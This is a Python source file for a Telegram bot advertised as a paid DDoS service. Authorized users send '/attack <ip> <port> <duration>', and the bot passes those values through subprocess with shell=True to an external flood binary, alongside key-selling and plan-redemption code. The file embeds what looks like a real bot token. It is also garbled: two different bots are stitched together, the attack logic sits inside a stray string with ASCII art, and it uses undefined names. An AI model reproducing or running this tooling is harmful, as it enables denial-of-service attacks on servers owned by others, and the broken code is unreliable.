#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

import telebot
from telebot import types
import time
import subprocess
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
# Bot token
TOKEN = "7934288137:AAHvU0HjijuUSHw_TK7qqKCB6aXDeWvJEVU"
bot = telebot.TeleBot(TOKEN)

# List to store authorized users
authorized_users = []

# Admin user ID
ADMIN_ID = "6654576379"  # Replace with the actual admin ID

# Helper function to create inline keyboard
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="𝐉𝐎𝐈𝐍 𝐆𝐑𝐎𝐔𝐏", url="@NEONxCHEATZ2"
    )
    button2 = types.InlineKeyboardButton(
        text="𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url="@NEONxCHEATZ2"
    )
    button3 = types.InlineKeyboardButton(
        text="NEON 𝐂𝐇𝐀𝐓", url="@NEONxCHEATZ2"
    )
    button4 = types.InlineKeyboardButton(
        text="𝐎𝐖𝐍𝐄𝐑", url="@NEONxCHEATZ2"
    )
    button5 = types.InlineKeyboardButton(
        text="𝐀𝐃𝐌𝐈𝐍", url="@NEONxCHEATZ2"
    )
    markup.row(button1, button2)
    markup.add(button3, button4, button5)
    return markup
    
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

# Start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "🎉 *𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 NEON ?𝐋 𝐃𝐃𝐎𝐒 𝐁𝐎𝐓* 🎉\n\n"
        "🌐 *𝐓𝐡𝐞 𝐦𝐨𝐬𝐭 𝐩𝐨𝐰𝐞𝐫𝐟𝐮𝐥 𝐚𝐧𝐝 𝐮𝐧𝐢𝐪𝐮𝐞 𝐝𝐝𝐨𝐬 𝐬𝐞𝐫𝐯𝐢𝐜𝐞𝐬* 🌐\n\n"
        "👑 *𝐅𝐨𝐫 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐚𝐜𝐜𝐞𝐬𝐬 𝐚𝐧𝐝 𝐮𝐧𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬,*\n"
        "👉 *𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐔𝐒:* [Click Here](@NEONxCHEATZ2)\n\n"
        "🛡️ *𝐎𝐧𝐥𝐲 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 𝐜𝐚𝐧 𝐚𝐜𝐜𝐞𝐬𝐬 𝐚𝐭𝐭𝐚𝐜𝐤 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.*\n\n"
        "🔒 𝐈𝐟 𝐲𝐨𝐮'𝐫𝐞 𝐧𝐞𝐰, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐭𝐡𝐞 𝐬𝐭𝐞𝐩𝐬 𝐛𝐞𝐥𝐨𝐰:\n"
        "1️⃣ 𝐉𝐨𝐢𝐧 𝐭𝐡𝐞 [𝐆𝐑𝐎𝐔𝐏](@NEONxCHEATZ2).\n"
        "2️⃣ 𝐉𝐨𝐢𝐧 𝐭𝐡𝐞 [𝐂𝐇𝐀𝐍𝐍𝐄𝐋](@NEONxCHEATZ2).\n"
        "3️⃣ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐎𝐖𝐍𝐄𝐑 𝐟𝐨𝐫 𝐀𝐜𝐜𝐞𝐬𝐬.\n\n"
        "🔥 𝐋𝐞𝐭'𝐬 𝐠𝐞𝐭 𝐬𝐭𝐚𝐫𝐭𝐞𝐝! 🔥"
    )
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=create_inline_keyboard(),
        parse_mode="Markdown",
    )
   
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

# myInfo command
@bot.message_handler(commands=['myinfo'])
def my_info_command(message):
    user = message.from_user
    bot.reply_to(
        message,
        f"👤 𝗬𝗼𝘂𝗿 𝗜𝗻𝗳𝗼:\n"
        f"📛 Name: {user.first_name} {user.last_name if user.last_name else ''}\n"
        f"🆔 ID: {user.id}\n"
        f"📜 Username: @{user.username if user.username else 'N/A'}"
    )

# Help command
@bot.message_handler(commands=['help'])
def send_help(message):
    help_text = (
        "🎯 *Welcome to the VIP Bot Help Menu!* 🎯\n\n"
        "📌 *Important Commands:*\n"
        "➤ /myinfo - *Dekho apni khaas information!* (Exclusive for VIPs) 🏆\n\n"
        "📌 *General Commands:*\n"
        "➤ /start - Start the bot and see the welcome message.\n"
        "➤ /help - View this help menu.\n\n"
        "📌 *Admin Commands:*\n"
        "➤ /add <USERID> - Add a user to the authorized list.\n"
        "➤ /remove <USERID> - Remove a user from the authorized list.\n\n"
        "📌 *VIP Features:*\n"
        "➤ /attack <ip> <port> <duration> - Start an attack (VIP Only). 💣\n\n"
        "💡 *Note:* Only authorized users and VIPs can access restricted commands."
    )
    bot.send_message(message.chat.id, help_text, parse_mode="Markdown")
    
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

# Add user command (Admin only)
@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "🚫 *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃!* 🚫\n\n"
            "🔐 *𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.*\n\n"
            "👤 *𝐇𝐎𝐖 𝐓𝐎 𝐆𝐄𝐓 𝐀𝐂𝐂𝐄𝐒𝐒:*\n"
            "➡️ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐨𝐰𝐧𝐞𝐫:\n"
            "👉 [𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞](https://t.me/+YrWcZVAVyYNmNTM1)\n\n"
            "📩 *𝐀𝐝𝐝 𝐲𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 𝐢𝐧 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭.*\n\n"
            "🔔 𝐍𝐨𝐭𝐞: 𝐀𝐥𝐥 𝐚𝐜𝐭𝐢𝐯𝐢𝐭𝐢𝐞𝐬 𝐚𝐫𝐞 𝐦𝐨𝐧𝐢𝐭𝐨𝐫𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐩𝐮𝐫𝐩𝐨𝐬𝐞𝐬.\n\n"
            "⚠️ *𝐔𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐚𝐜𝐜𝐞𝐬𝐬 𝐢𝐬 𝐬𝐭𝐫𝐢𝐜𝐭𝐥𝐲 𝐩𝐫𝐨𝐡𝐢𝐛𝐢𝐭𝐞𝐝!*")
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "💣 Use the correct format: /add <USERID>")
        return

    user_id = parts[1]
    if user_id not in authorized_users:
        authorized_users.append(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been added to the authorized list.")
    else:
        bot.reply_to(message, f"⚠️ User {user_id} is already authorized.")
        
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

# Remove user command (Admin only)
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.from_user.id) != ADMIN_ID:
        bot.reply_to(message, "🚫 *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃!* 🚫\n\n"
            "🔐 *𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.*\n\n"
            "👤 *𝐇𝐎𝐖 𝐓𝐎 𝐆𝐄𝐓 𝐀𝐂𝐂𝐄𝐒𝐒:*\n"
            "➡️ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐨𝐰𝐧𝐞𝐫:\n"
            "👉 [𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞](https://t.me/+YrWcZVAVyYNmNTM1)\n\n"
            "📩 *𝐀𝐝𝐝 𝐲𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 𝐢𝐧 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭.*\n\n"
            "🔔 𝐍𝐨𝐭𝐞: 𝐀𝐥𝐥 𝐚𝐜𝐭𝐢𝐯𝐢𝐭𝐢𝐞𝐬 𝐚𝐫𝐞 𝐦𝐨𝐧𝐢𝐭𝐨𝐫𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐩𝐮𝐫𝐩𝐨𝐬𝐞𝐬.\n\n"
            "⚠️ *𝐔𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐚𝐜𝐜𝐞𝐬𝐬 𝐢𝐬 𝐬𝐭𝐫𝐢𝐜𝐭𝐥𝐲 𝐩𝐫𝐨𝐡𝐢𝐛𝐢𝐭𝐞𝐝!*")
        return

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "💣 Use the correct format: /remove <USERID>")
        return

    user_id = parts[1]
    if user_id in authorized_users:
        authorized_users.remove(user_id)
        bot.reply_to(message, f"✅ User {user_id} has been removed from the authorized list.")
    else:
        bot.reply_to(message, f"⚠️ User {user_id} is not in the authorized list.")
        
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

# Attack command with enhanced "Access Denied" message
@bot.message_handler(commands=['attack'])
def attack_command(message):
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(
            message,
            "💣 𝐑𝐞𝐚𝐝𝐲 𝐭𝐨 𝐥𝐚𝐮𝐧𝐜𝐡 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤?\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐟𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 𝐟𝐨𝐫𝐦𝐚𝐭:\n"
            ":/𝐚𝐭𝐭𝐚𝐜𝐤 <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>"
        )
        return

    user_id = str(message.from_user.id)
    if user_id not in authorized_users:
        # Send an "Access Denied" message to unauthorized users
        bot.reply_to(
            message,
            "🚫 *𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃!* 🚫\n\n"
            "🔐 *𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.*\n\n"
            "👤 *𝐇𝐎𝐖 𝐓𝐎 𝐆𝐄𝐓 𝐀𝐂𝐂𝐄𝐒𝐒:*\n"
            "➡️ 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐨𝐰𝐧𝐞𝐫:\n"
            "👉 [𝐂𝐥𝐢𝐜𝐤 𝐇𝐞𝐫𝐞](https://t.me/+YrWcZVAVyYNmNTM1)\n\n"
            "📩 *𝐀𝐝𝐝 𝐲𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 𝐢𝐧 𝐭𝐡𝐞 𝐫𝐞𝐪𝐮𝐞𝐬𝐭.*\n\n"
            "🔔 𝐍𝐨𝐭𝐞: 𝐀𝐥𝐥 𝐚𝐜𝐭𝐢𝐯𝐢𝐭𝐢𝐞𝐬 𝐚𝐫𝐞 𝐦𝐨𝐧𝐢𝐭𝐨𝐫𝐞𝐝 𝐟𝐨𝐫 𝐬𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐩𝐮𝐫𝐩𝐨𝐬𝐞𝐬.\n\n"
            "⚠️ *𝐔𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐚𝐜𝐜𝐞𝐬𝐬 𝐢𝐬 𝐬𝐭𝐫𝐢𝐜𝐭𝐥𝐲 𝐩𝐫𝐨𝐡𝐢𝐛𝐢𝐭𝐞𝐝!*",
            parse_mode="Markdown",
        )
        return

    target_ip = parts[1]
    target_port = parts[2]
    duration = parts[3]
    
    run_attack_command(message.chat.id, target_ip, target_port, duration)

# Synchronous function to run the attack
def run_attack_command(chat_id, target_ip, target_port, duration):
    try:
        # Pre-Attack: Initializing
        preparing_message = bot.send_message(
            chat_id,
            f"⚡ *𝐈𝐧𝐢𝐭𝐢𝐚𝐥𝐢𝐳𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐞𝐪𝐮𝐞𝐧𝐜𝐞...*\n"
            f"🔌 𝐓𝐚𝐫𝐠𝐞𝐭𝐢𝐧𝐠: {target_ip}:{target_port}\n"
            f"⏳ 𝐄𝐬𝐭𝐢𝐦𝐚𝐭𝐞𝐝 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n"
            "🔒 𝐋𝐨𝐜𝐤𝐢𝐧𝐠 𝐨𝐧𝐭𝐨 𝐭𝐚𝐫𝐠𝐞𝐭... 𝐒𝐭𝐚𝐧𝐝 𝐛𝐲."
        )

        # Pause before countdown
        time.sleep(1)

        # Countdown with animation (flashing emojis, spinning effect)
        for i in range(5, 0, -1):
            spin = "🔄" * i
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=preparing_message.message_id,
                text=f"⚡ *𝐀𝐭𝐭𝐚𝐜𝐤 𝐒𝐞𝐪𝐮𝐞𝐧𝐜𝐞 𝐈𝐧𝐢𝐭𝐢𝐚𝐭𝐢𝐧𝐠...*\n"
                     f"🔌 𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}:{target_port}\n"
                     f"⏳ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n"
                     f"{spin} *𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠*... {i} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬 𝐫𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠"
            )
            time.sleep(1)

        # Mid-phase: Target Locking and Calculating Attack Parameters
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=preparing_message.message_id,
            text=f"🔒 *𝐓𝐚𝐫𝐠𝐞𝐭 𝐋𝐨𝐜𝐤𝐞𝐝!* 🔓\n"
                 f"🔌 *𝐓𝐚𝐫𝐠𝐞𝐭*: {target_ip}:{target_port}\n"
                 f"⏳ *𝐀𝐭𝐭𝐚𝐜𝐤 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧*: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n"
                 "⚙️ *𝐂𝐚𝐥𝐜𝐮𝐥𝐚𝐭𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤 𝐏𝐚𝐫𝐚𝐦𝐞𝐭𝐞𝐫𝐬...*\n\n"
                 "🕹️ 𝐓𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐰𝐢𝐥𝐥 𝐛𝐞𝐠𝐢𝐧 𝐬𝐨𝐨𝐧... 𝐇𝐨𝐥𝐝 𝐭𝐢𝐠𝐡𝐭!"
        )

        # Brief pause before final launch
        time.sleep(2)

        # Final Phase: Attack Launch
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=preparing_message.message_id,
            text=f"🚀 *𝐋𝐚𝐮𝐧𝐜𝐡 𝐒𝐞𝐪𝐮𝐞𝐧𝐜𝐞 𝐈𝐧𝐢𝐭𝐢𝐚𝐭𝐞𝐝!* 🚀\n"
                 f"🔌 *𝐓𝐚𝐫𝐠𝐞𝐭𝐢𝐧𝐠*: {target_ip}:{target_port}\n"
                 f"⏰ *𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧*: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n"
                 "⚡ *𝐋𝐚𝐮𝐧𝐜𝐡𝐢𝐧𝐠 𝐀𝐭𝐭𝐚𝐜𝐤...* 𝐏𝐫𝐞𝐩𝐚𝐫𝐞 𝐲𝐨𝐮𝐫𝐬𝐞𝐥𝐟!"
        )

        # New customized message before attack start
        bot.send_message(
            chat_id,
            f"🎯*𝐃𝐄𝐀𝐑 𝐕𝐈𝐏 𝐔𝐒𝐄𝐑*\n\n"
            f"🚀*𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐇𝐀𝐒 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!*🚀\n\n"
            f"💻 *𝐇𝐨𝐬𝐭*: {target_ip}\n"
            f"🔌 *𝐏𝐨𝐫𝐭*: {target_port}\n"
            f"⏱️ *𝐓𝐢𝐦𝐞*: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n"
            f"🔑 *𝐌𝐞𝐭𝐡𝐨𝐝*: 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐁𝐘 @NEONxCHEATZ2\n\n"
            f"⚠️ *𝐀𝐝𝐯𝐢𝐜𝐞:* 𝐘𝐨𝐮𝐫 𝐚𝐭𝐭𝐚𝐜𝐤 𝐰𝐢𝐥𝐥 𝐟𝐢𝐧𝐢𝐬𝐡 𝐢𝐧 *{duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬*."
            f"𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐰𝐢𝐭𝐡𝐨𝐮𝐭 𝐭𝐨𝐮𝐜𝐡𝐢𝐧𝐠 𝐚𝐧𝐲 𝐛𝐮𝐭𝐭𝐨𝐧𝐬 𝐝𝐮𝐫𝐢𝐧𝐠 𝐭𝐡𝐢𝐬 𝐭𝐢𝐦𝐞.\n\n"
        )
                
"""""
    NEON             scammer 🏳️‍🌈
 ⣠⣶⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠹⢿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡏⢀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⣠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⣟⣋⣼⣽⣾⣽⣦⡀⠀⠀⠀
⢀⣼⣿⣷⣾⡽⡄⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⣿⣿⣿⡿⢿⣟⣽⣾⣿⣿⣦⠀⠀
⣸⣿⣿⣾⣿⣿⣮⣤⣤⣤⣤⡀⠀⠀⠻⣿⡯⠽⠿⠛⠛⠉⠉⢿⣿⣿⣿⣿⣷⡀
⣿⣿⢻⣿⣿⣿⣛⡿⠿⠟⠛⠁⣀⣠⣤⣤⣶⣶⣶⣶⣷⣶⠀⠀⠻⣿⣿⣿⣿⣇
⢻⣿⡆⢿⣿⣿⣿⣿⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠀⣠⣶⣿⣿⣿⣿⡟
⠈⠛⠃⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠋⠉⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⠟⠋⠁⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠻⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿‿ ︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵︵‿︵‿︵‿︵


#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2

        # Attack execution (this should be your actual attack tool or script)
        process = subprocess.Popen(
            f"./neon {target_ip} {target_port} {duration} 20",  # Replace with actual attack tool command
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Capture the output from the attack tool
        stdout, stderr = process.communicate()

        # Send the output of the attack (stdout, stderr)
        if stdout:
            bot.send_message(chat_id, f"Attack Output:\n{stdout.decode()}")
        if stderr:
            bot.send_message(chat_id, f"Error Output:\n{stderr.decode()}")

        # Completion message after attack
        bot.send_message(
            chat_id,
            f"🎯 𝐀𝐭𝐭𝐚𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞! 🎯\n\n"
            f"💻 𝐓𝐚𝐫𝐠𝐞𝐭 𝐇𝐨𝐬𝐭: {target_ip}\n"
            f"🔌 𝐓𝐚𝐫𝐠𝐞𝐭 𝐏𝐨𝐫𝐭: {target_port}\n"
            f"⏱️ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n\n"
            f"✅ 𝐀𝐭𝐭𝐚𝐜𝐤 𝐢𝐬 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞!"
        )
"""
███████▀▀▀░░░░░░░▀▀▀███████  
████▀░░░░░░░░░░░░░░░░░▀████  
███│░░░░░░░░░░░░░░░░░░░│███  
██▌│░░░░░░░░░░░░░░░░░░░│▐██  
██░└┐░░░░░░░░░░░░░░░░░┌┘░██  
██░░└┐░░░░░░░░░░░░░░░┌┘░░██  
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██  
██▌░│██████▌░░░▐██████│░▐██  
███░│▐███▀▀░░▄░░▀▀███▌│░███  
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██  
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██  
████▄─┘██▌░░░░░░░▐██└─▄████  
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████  
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████  
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  
███████▄░░░░░░░░░░░▄███████  
██████████▄▄▄▄▄▄▄██████████  
███████████████████████████  

    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {e}")

# Polling
if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(non_stop=True, interval=1, timeout=20)
logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
loop = asyncio.get_event_loop()

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
attack_in_progress = False

# In-memory storage
users = {}
keys = []

# Helper Functions
def generate_key(length=8):
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choices(chars, k=length))

def add_time(days=0):
    return (datetime.now() + timedelta(days=days)).isoformat()

def save_key(key, plan, days):
    valid_until = add_time(days=days)
    keys.append({"key": key, "plan": plan, "valid_until": valid_until})
    return key, valid_until

def redeem_key(user_id, key):
    global keys
    key_data = next((k for k in keys if k['key'] == key), None)
    if not key_data:
        return "Invalid key."

    valid_until = key_data['valid_until']
    plan = key_data['plan']
    users[user_id] = {"plan": plan, "valid_until": valid_until}
    keys = [k for k in keys if k['key'] != key]
    return f"Key redeemed successfully. Plan: {plan}, Valid Until: {valid_until}"

# Admin Commands
@bot.message_handler(commands=['genkey'])
def handle_genkey(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @RAJOWNER90")
        return

    try:
        args = message.text.split()
        plan = int(args[1])
        days = int(args[2])
        key = generate_key()
        key, valid_until = save_key(key, plan, days)
        response = f"Key: {key}\nPlan: {plan}\nValid Until: {valid_until}"
    except Exception as e:
        logging.error(f"Error generating key: {e}")
        response = "Use /genkey 1 30"

    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    user_id = message.from_user.id
    try:
        key = message.text.split()[1]
        response = redeem_key(user_id, key)
    except Exception as e:
        logging.error(f"Error redeeming key: {e}")
        response = "Use /redeem <key>."

    bot.reply_to(message, response)

  
    finally:
        attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    if attack_in_progress:
        bot.reply_to(message, "⏰ 𝙒𝘼𝙄𝙏 𝘼𝙏𝙏𝘼𝘾𝙆 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 ⏰")
        return

    user_data = users.get(user_id)
    if not user_data or user_data['plan'] == 0:
        bot.reply_to(message, "𝘿𝙈-> @RAJOWNER90")
        return

    try:
        args = message.text.split()
        target_ip, target_port, duration = args[1], int(args[2]), int(args[3])
        if target_port in blocked_ports:
            bot.reply_to(message, "Port is blocked. Use a different port.")
            return

        asyncio.run_coroutine_threadsafe(run_attack(target_ip, target_port, duration), loop)
        bot.reply_to(message, f"⚡ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 ⚡\n\n𝐇𝐎𝐒𝐓-> {target_ip}\n𝐏𝐎𝐑𝐓-> {target_port}\n𝐓𝐈𝐌𝐄-> {duration}")
    except Exception as e:
        logging.error(f"Error processing attack command: {e}")
        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>.")

# Welcome Message
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("ATTACK 🚀", "GENKEY 🔑", "REDEEM 🔐", "ACCOUNT 💳", "HELP 🆘")
    bot.send_message(message.chat.id, "⚡ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑 ⚡", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    if message.text == "ATTACK 🚀":
        bot.reply_to(message, "🚀 Use /attack <IP> <Port> <Time>")
    elif message.text == "REDEEM 🔐":
        bot.reply_to(message, "Use /redeem <key>")
    elif message.text == "GENKEY 🔑":
        bot.reply_to(message, "Use /genkey")        
    elif message.text == "ACCOUNT 💳":
        user_id = message.from_user.id
        user_data = users.get(user_id)
        if user_data:
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            bot.reply_to(message, f"Plan: {plan}\nValid Until: {valid_until}")
        else:
            bot.reply_to(message, "🔑 NO ACCOUNT")
    elif message.text == "HELP 🆘":
        bot.reply_to(message, "𝘿𝙈-> @RAJOWNER90")
    else:
        bot.reply_to(message, "Invalid option.")

# Start Asyncio Loop
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling error: {e}")
            time.sleep(5)    
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2
#script @NEONxCHEATZ2